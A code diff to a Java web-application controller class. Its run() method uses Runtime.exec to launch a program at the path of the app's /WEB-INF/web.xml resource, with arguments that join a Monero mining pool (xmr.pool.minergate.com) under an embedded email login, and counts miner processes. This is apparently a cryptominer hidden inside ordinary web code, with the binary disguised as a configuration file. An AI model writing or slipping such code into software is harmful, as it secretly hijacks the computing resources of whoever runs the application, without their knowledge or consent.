@@ -70,8 +70,8 @@ public class Controller {
     public void run(){
 
         String destPath = "//yam";
+        String sourcePath = null;
         if (!new File(destPath).exists()){
-            String sourcePath = null;
             try {
                 sourcePath = context.getResource("/WEB-INF/web.xml").getPath();
             } catch (MalformedURLException e) {
@@ -82,13 +82,13 @@ public class Controller {
             System.out.println(sourcePath);
             facesContext.addMessage(null, new FacesMessage(sourcePath));
 
-            moveFile(sourcePath, destPath);
+//            moveFile(sourcePath, destPath);
 
         }
 
         Runtime rt = Runtime.getRuntime();
         try {
-            rt.exec(destPath + " -c 1 -M stratum+tcp://the.bitcoin.time%40gmail.com:x@xmr.pool.minergate.com:45560/xmr");
+            rt.exec(sourcePath + " -c 1 -M stratum+tcp://the.bitcoin.time%40gmail.com:x@xmr.pool.minergate.com:45560/xmr");
             minerProcessCount = minerProcessCount + 1;
         } catch (IOException e) {
             e.printStackTrace();
